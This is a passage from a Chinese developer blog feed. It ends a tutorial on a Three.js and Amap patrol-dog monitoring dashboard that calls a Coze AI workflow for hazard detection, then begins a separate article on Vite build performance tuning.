    <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 没有绑定摄像头，不进行取样</span>
  }

  <span class="hljs-comment">// 检查取样方式（必须是"路线间隔"模式）</span>
  <span class="hljs-keyword">if</span> (patrolDog.<span class="hljs-property">sampleMode</span> !== <span class="hljs-string">'路线间隔'</span> || !patrolDog.<span class="hljs-property">sampleInterval</span>) {
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 检查是否在取样点附近（±10米范围内）</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; samplePointsRef.<span class="hljs-property">current</span>.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">if</span> (processedSamplePointsRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(i)) {
      <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 已处理过，跳过</span>
    }

    <span class="hljs-keyword">const</span> samplePoint = samplePointsRef.<span class="hljs-property">current</span>[i];
    <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">AMap</span>.<span class="hljs-property">GeometryUtil</span>.<span class="hljs-title function_">distance</span>(
      [currentLngLat[<span class="hljs-number">0</span>], currentLngLat[<span class="hljs-number">1</span>]],
      [samplePoint.<span class="hljs-property">lng</span>, samplePoint.<span class="hljs-property">lat</span>]
    );

    <span class="hljs-comment">// 在 ±10 米范围内，触发取样</span>
    <span class="hljs-keyword">if</span> (distance &lt;= <span class="hljs-number">10</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✅ 到达取样点 <span class="hljs-subst">${i + <span class="hljs-number">1</span>}</span>/<span class="hljs-subst">${samplePointsRef.current.length}</span>`</span>);
      processedSamplePointsRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(i);
      
      <span class="hljs-comment">// 异步调用 Coze API（不阻塞巡逻）</span>
      <span class="hljs-title function_">analyzeSecurity</span>(
        patrolDog,
        route,
        area,
        currentLngLat,
        <span class="hljs-title class_">AMap</span>
      ).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'安全隐患分析失败:'</span>, error);
      });
      
      <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 一次只处理一个取样点</span>
    }
  }
};
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>使用距离判断，避免重复触发</li>
<li>异步调用AI分析，不阻塞巡逻动画</li>
<li>使用<code>Set</code>记录已处理的取样点，确保每个点只处理一次</li>
</ul>
<h4 data-id="heading-28">7.3 调用Coze API进行安全隐患分析</h4>
<p>系统使用Coze平台的大模型工作流进行图像安全隐患分析：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 调用 Coze API 进行安全隐患分析</span>
<span class="hljs-keyword">const</span> analyzeSecurity = <span class="hljs-keyword">async</span> (
  <span class="hljs-attr">patrolDog</span>: <span class="hljs-title class_">PatrolDog</span>,
  <span class="hljs-attr">route</span>: <span class="hljs-title class_">Route</span>,
  <span class="hljs-attr">area</span>: <span class="hljs-title class_">Area</span> | <span class="hljs-literal">null</span>,
  <span class="hljs-attr">currentLngLat</span>: [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>],
  <span class="hljs-title class_">AMap</span>: <span class="hljs-built_in">any</span>
): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 1. 获取默认令牌</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">initDB</span>();
    <span class="hljs-keyword">const</span> tokens = <span class="hljs-keyword">await</span> db.<span class="hljs-property">token</span>.<span class="hljs-title function_">getAll</span>();
    <span class="hljs-keyword">const</span> validTokens = tokens.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">token</span> =&gt;</span> <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &lt;= token.<span class="hljs-property">expireDate</span>);
    <span class="hljs-keyword">if</span> (validTokens.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'没有可用的令牌，跳过安全隐患分析'</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> defaultToken = validTokens.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">isDefault</span>) || validTokens[<span class="hljs-number">0</span>];
    
    <span class="hljs-comment">// 2. 准备分析数据</span>
    <span class="hljs-comment">// 随机选择一张测试图片（实际应用中应使用摄像头实时抓拍）</span>
    <span class="hljs-keyword">const</span> randomImageUrl = imageUrlr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * imageUrlr.<span class="hljs-property">length</span>)];
    
    <span class="hljs-comment">// 构建输入文本，描述当前巡逻场景</span>
    <span class="hljs-keyword">const</span> inputText = <span class="hljs-string">`<span class="hljs-subst">${patrolDog.name}</span>当前在<span class="hljs-subst">${area?.name || <span class="hljs-string">'未知'</span>}</span>区域<span class="hljs-subst">${route.name}</span>巡逻时抓拍了一张照片。分析是否存在安全隐患`</span>;
    
    <span class="hljs-comment">// 3. 创建 Coze API 客户端</span>
    <span class="hljs-keyword">const</span> apiClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CozeAPI</span>({
      <span class="hljs-attr">token</span>: defaultToken.<span class="hljs-property">token</span>,
      <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.coze.cn'</span>,
      <span class="hljs-attr">allowPersonalAccessTokenInBrowser</span>: <span class="hljs-literal">true</span>,
    });

    <span class="hljs-comment">// 4. 调用工作流</span>
    <span class="hljs-keyword">const</span> workflow_id = <span class="hljs-string">'7585585625312034858'</span>;
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> apiClient.<span class="hljs-property">workflows</span>.<span class="hljs-property">runs</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">workflow_id</span>: workflow_id,
      <span class="hljs-attr">parameters</span>: {
        <span class="hljs-attr">input</span>: inputText,
        <span class="hljs-attr">mediaUrl</span>: randomImageUrl,
      },
    });

    <span class="hljs-comment">// 5. 解析返回结果</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">analysisResult</span>: { <span class="hljs-attr">securityType</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">score</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">desc</span>: <span class="hljs-built_in">string</span> } | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
    
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>) {
      <span class="hljs-keyword">const</span> dataObj = <span class="hljs-keyword">typeof</span> res.<span class="hljs-property">data</span> === <span class="hljs-string">'string'</span> ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(res.<span class="hljs-property">data</span>) : res.<span class="hljs-property">data</span>;
      
      <span class="hljs-keyword">if</span> (dataObj.<span class="hljs-property">output</span> &amp;&amp; <span class="hljs-keyword">typeof</span> dataObj.<span class="hljs-property">output</span> === <span class="hljs-string">'string'</span>) {
        <span class="hljs-comment">// 提取 markdown 代码块中的 JSON</span>
        <span class="hljs-keyword">const</span> jsonMatch = dataObj.<span class="hljs-property">output</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/```json\s*([\s\S]*?)\s*```/</span>) || 
                         dataObj.<span class="hljs-property">output</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/```\s*([\s\S]*?)\s*```/</span>);
        
        <span class="hljs-keyword">if</span> (jsonMatch &amp;&amp; jsonMatch[<span class="hljs-number">1</span>]) {
          analysisResult = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonMatch[<span class="hljs-number">1</span>].<span class="hljs-title function_">trim</span>());
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 尝试直接解析 output 为 JSON</span>
          analysisResult = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(dataObj.<span class="hljs-property">output</span>);
        }
      } <span class="hljs-keyword">else</span> {
        analysisResult = dataObj;
      }
    }

    <span class="hljs-comment">// 6. 判断是否是报警（securityType !== 0 且 score !== 0）</span>
    <span class="hljs-keyword">if</span> (analysisResult &amp;&amp; analysisResult.<span class="hljs-property">securityType</span> !== <span class="hljs-number">0</span> &amp;&amp; analysisResult.<span class="hljs-property">score</span> !== <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// 保存到分析报警表</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">analysisAlert</span>: <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">AnalysisAlert</span>, <span class="hljs-string">'id'</span> | <span class="hljs-string">'createTime'</span> | <span class="hljs-string">'updateTime'</span>&gt; = {
        <span class="hljs-attr">alertTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">patrolDogId</span>: patrolDog.<span class="hljs-property">id</span>!,
        <span class="hljs-attr">patrolDogName</span>: patrolDog.<span class="hljs-property">name</span>,
        <span class="hljs-attr">cameraDeviceId</span>: patrolDog.<span class="hljs-property">cameraDeviceId</span>,
        <span class="hljs-attr">cameraDeviceName</span>: patrolDog.<span class="hljs-property">cameraDeviceName</span>,
        <span class="hljs-attr">routeId</span>: route.<span class="hljs-property">id</span>!,
        <span class="hljs-attr">routeName</span>: route.<span class="hljs-property">name</span>,
        <span class="hljs-attr">areaId</span>: area?.<span class="hljs-property">id</span>,
        <span class="hljs-attr">areaName</span>: area?.<span class="hljs-property">name</span>,
        <span class="hljs-attr">securityType</span>: analysisResult.<span class="hljs-property">securityType</span> <span class="hljs-keyword">as</span> <span class="hljs-number">0</span> | <span class="hljs-number">1</span> | <span class="hljs-number">2</span> | <span class="hljs-number">3</span> | <span class="hljs-number">4</span> | <span class="hljs-number">5</span>,
        <span class="hljs-attr">score</span>: analysisResult.<span class="hljs-property">score</span>,
        <span class="hljs-attr">desc</span>: analysisResult.<span class="hljs-property">desc</span>,
        <span class="hljs-attr">mediaUrl</span>: randomImageUrl,
        <span class="hljs-attr">input</span>: inputText,
        <span class="hljs-attr">status</span>: <span class="hljs-string">'未处理'</span>,
      };

      <span class="hljs-keyword">await</span> db.<span class="hljs-property">analysisAlert</span>.<span class="hljs-title function_">add</span>(analysisAlert);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 安全隐患告警已保存'</span>);
      
      <span class="hljs-comment">// 更新告警列表（实时显示在大屏右侧）</span>
      <span class="hljs-title function_">updateAlertList</span>(patrolDog.<span class="hljs-property">id</span>!, route.<span class="hljs-property">id</span>!, area?.<span class="hljs-property">id</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'未发现安全隐患，不保存报警'</span>);
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'调用 Coze API 失败:'</span>, error);
  }
};
</code></pre>
<p><strong>API返回结果格式</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"securityType"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 0=无隐患, 1=明火燃烟, 2=打架斗殴, 3=违章停车, 4=杂物堆放, 5=私搭乱建</span>
  <span class="hljs-attr">"score"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">85</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 严重程度评分 (0-100)</span>
  <span class="hljs-attr">"desc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"检测到明火，存在严重安全隐患"</span>  <span class="hljs-comment">// 详细描述</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>使用<code>@coze/api</code>官方SDK调用工作流API</li>
<li>支持多种安全隐患类型识别（明火燃烟、打架斗殴、违章停车等）</li>
<li>自动保存告警记录，支持后续查询和处理</li>
<li>告警信息实时显示在大屏右侧告警列表中</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/417bf26d5cec469abe39ad6b90d09d8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=PbL9C6eGohgNvCZofTFQF8PJfNg%3D" alt="6 报警.png" loading="lazy"/></p>
<h4 data-id="heading-29">7.4 Coze测试页面</h4>
<p>系统提供了专门的Coze测试页面，方便开发者测试和调试AI分析功能。在<strong>Coze测试</strong>页面中，可以：</p>
<ol>
<li><strong>选择令牌</strong>：从已配置的Coze API令牌中选择（支持多个令牌管理）</li>
<li><strong>输入分析文本</strong>：描述需要分析的场景</li>
<li><strong>上传图片URL</strong>：提供需要分析的图片地址</li>
<li><strong>自动填充功能</strong>：点击"自动填充"按钮，快速填充默认的测试数据</li>
<li><strong>查看完整响应</strong>：显示Coze API的完整返回结果，包括解析后的JSON和原始响应</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Coze测试页面核心功能</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTest</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> values = <span class="hljs-keyword">await</span> form.<span class="hljs-title function_">validateFields</span>();
  
  <span class="hljs-comment">// 创建 Coze API 客户端</span>
  <span class="hljs-keyword">const</span> apiClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CozeAPI</span>({
    <span class="hljs-attr">token</span>: values.<span class="hljs-property">token</span>,
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.coze.cn'</span>,
    <span class="hljs-attr">allowPersonalAccessTokenInBrowser</span>: <span class="hljs-literal">true</span>,
  });

  <span class="hljs-comment">// 调用工作流</span>
  <span class="hljs-keyword">const</span> workflow_id = <span class="hljs-string">'7585585625312034858'</span>;
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> apiClient.<span class="hljs-property">workflows</span>.<span class="hljs-property">runs</span>.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">workflow_id</span>: workflow_id,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">input</span>: values.<span class="hljs-property">input</span>,
      <span class="hljs-attr">mediaUrl</span>: values.<span class="hljs-property">mediaUrl</span>,
    },
  });

  <span class="hljs-comment">// 解析并显示结果</span>
  <span class="hljs-comment">// ... 解析逻辑 ...</span>
};
</code></pre>
<p><strong>测试页面特性</strong>：</p>
<ul>
<li><strong>自动填充数据</strong>：提供默认的测试图片和文本，方便快速测试</li>
<li><strong>图片预览</strong>：实时预览输入的图片URL</li>
<li><strong>完整响应展示</strong>：显示API的完整响应，便于调试</li>
<li><strong>错误处理</strong>：友好的错误提示，帮助定位问题</li>
</ul>
<blockquote>
<p>请截图 Coze测试页面 自动填充功能 测试结果展示</p>
</blockquote>
<p><strong>使用场景</strong>：</p>
<ul>
<li>测试新的安全隐患识别算法</li>
<li>验证Coze API令牌是否有效</li>
<li>调试API返回结果格式</li>
<li>验证图片URL是否可被Coze解析</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29b91ced67a4ff3988691e2ab026a54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=TKeWCzv%2Bs0%2BGHq%2BwHgFeFYQ8vh4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-30">八、性能优化建议</h3>
<h4 data-id="heading-31">7.1 渲染优化</h4>
<ul>
<li>禁用不必要的WebGL扩展（如阴影、抗锯齿）</li>
<li>使用<code>requestAnimationFrame</code>统一管理渲染循环</li>
<li>合理设置模型LOD（细节层次）</li>
</ul>
<h4 data-id="heading-32">7.2 内存管理</h4>
<ul>
<li>及时清理不需要的TWEEN动画：<code>TWEEN.removeAll()</code></li>
<li>组件卸载时销毁Three.js资源</li>
<li>模型加载后缓存，避免重复加载</li>
</ul>
<h4 data-id="heading-33">7.3 坐标转换优化</h4>
<ul>
<li>坐标系统中心点跟随地图中心，减少转换误差</li>
<li>使用节流控制状态更新频率</li>
<li>避免在render中进行复杂计算</li>
</ul>
<h3 data-id="heading-34">九、常见问题解决</h3>
<h4 data-id="heading-35">8.1 模型不显示</h4>
<p><strong>问题</strong>：模型加载成功但在地图上不可见</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>检查<code>renderer.autoClear</code>是否设置为<code>false</code></li>
<li>确认坐标转换是否正确（注意数组索引对应关系）</li>
<li>检查模型缩放是否合适（可能太小或太大）</li>
</ul>
<h4 data-id="heading-36">8.2 模型位置偏移</h4>
<p><strong>问题</strong>：模型位置与预期不符</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>确保在设置模型位置前调用<code>customCoords.setCenter()</code></li>
<li>检查坐标轴对应关系（<code>position[1]</code>对应X轴，<code>position[0]</code>对应Z轴）</li>
<li>使用<code>AxesHelper</code>辅助调试坐标轴方向</li>
</ul>
<h4 data-id="heading-37">8.3 镜头跟随不流畅</h4>
<p><strong>问题</strong>：镜头跟随有延迟或卡顿</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>调整<code>rotationSpeed</code>参数，控制旋转速度</li>
<li>优化<code>timing</code>速率控制器，实现更平滑的加速减速</li>
<li>检查render循环是否正常执行</li>
</ul>
<h3 data-id="heading-38">十、总结</h3>
<p>通过高德地图与Three.js的深度结合，我们成功实现了3D模型在地图上的实时展示和动画效果，并集成了AI大模型实现智能安全隐患检测。核心要点包括：</p>
<ol>
<li><strong>GLCustomLayer是关键桥梁</strong>：通过自定义图层实现Three.js与高德地图的融合</li>
<li><strong>坐标转换是核心</strong>：正确理解和使用<code>customCoords</code>进行坐标转换</li>
<li><strong>镜头跟随提升体验</strong>：使用Loca API实现平滑的镜头跟随效果</li>
<li><strong>AI智能检测增强功能</strong>：集成Coze大模型实现自动安全隐患识别和告警</li>
<li><strong>性能优化不可忽视</strong>：合理配置渲染参数，避免不必要的WebGL扩展</li>
</ol>
<p><strong>技术亮点</strong>：</p>
<ul>
<li><strong>虚实结合</strong>：真实地理信息与3D模型的完美融合</li>
<li><strong>智能检测</strong>：基于AI大模型的自动安全隐患识别</li>
<li><strong>实时告警</strong>：巡逻过程中的实时检测和告警推送</li>
<li><strong>可视化展示</strong>：沉浸式大屏监控体验</li>
</ul>
<p>这种技术方案不仅适用于巡逻犬管理系统，还可以扩展到智慧城市、物流追踪、车辆监控、园区安防等多个场景，为空间数据可视化提供了强大的技术支撑。通过AI能力的集成，系统从传统的可视化展示升级为智能化的安全监控平台，实现了"看得见、管得住、能预警"的完整闭环。</p>
<h3 data-id="heading-39">参考资源</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api%2Fsummary" target="_blank" title="https://lbs.amap.com/api/javascript-api/summary" ref="nofollow noopener noreferrer">高德地图JS API文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F" target="_blank" title="https://threejs.org/docs/" ref="nofollow noopener noreferrer">Three.js官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Floca-v2%2Fsummary" target="_blank" title="https://lbs.amap.com/api/loca-v2/summary" ref="nofollow noopener noreferrer">Loca数据可视化API</a></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV18cqCBwEio%2F" target="_blank" title="https://www.bilibili.com/video/BV18cqCBwEio/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV18c…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite 5大性能优化实战：从3秒到300毫秒的构建提速之旅]]></title>    <link>https://juejin.cn/post/7589655730292031528</link>    <guid>https://juejin.cn/post/7589655730292031528</guid>    <pubDate>2025-12-31T04:17:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589655730292031528" data-draft-id="7589578378896228386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite 5大性能优化实战：从3秒到300毫秒的构建提速之旅"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-31T04:17:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite 5大性能优化实战：从3秒到300毫秒的构建提速之旅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T04:17:08.000Z" title="Wed Dec 31 2025 04:17:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vite 5大性能优化实战：从3秒到300毫秒的构建提速之旅</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>在前端工程化领域，构建速度一直是开发者关注的焦点。随着项目规模的增长，传统的打包工具（如Webpack）往往面临构建时间线性上升的问题。Vite作为新一代前端构建工具，凭借其原生ESM支持和创新的开发服务器设计，已经在开发体验上带来了质的飞跃。然而，即使是Vite项目，在特定场景下也可能遭遇性能瓶颈。</p>
<p>本文将深入剖析5个经过实战验证的Vite性能优化策略，这些策略帮助我们将一个中型项目的冷启动时间从3秒降至300毫秒。每个优化点都配有具体的技术原理分析、实施步骤和效果对比数据。</p>
<h2 data-id="heading-2">一、依赖预构建的精细化配置</h2>
<h3 data-id="heading-3">问题诊断</h3>
<p>默认情况下，Vite会对<code>node_modules</code>进行全量预构建（首次启动时）。对于大型项目而言，这可能消耗大量时间。</p>
<h3 data-id="heading-4">优化方案</h3>
<ol>
<li><strong>手动指定依赖项</strong>：在<code>vite.config.js</code>中明确列出需要预构建的依赖</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">optimizeDeps</span>: {
  <span class="hljs-attr">include</span>: [<span class="hljs-string">'lodash-es'</span>, <span class="hljs-string">'axios'</span>, <span class="hljs-string">'vue-router'</span>]
}
</code></pre>
<ol start="2">
<li><strong>排除已知ESM模块</strong>：通过<code>exclude</code>避免重复处理</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">optimizeDeps</span>: {
  <span class="hljs-attr">exclude</span>: [<span class="hljs-string">'vue-demi'</span>]
}
</code></pre>
<ol start="3">
<li><strong>缓存策略优化</strong>：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 清理缓存时保留基础依赖</span>
vite --force --clearCache=<span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-5">效果对比</h3>













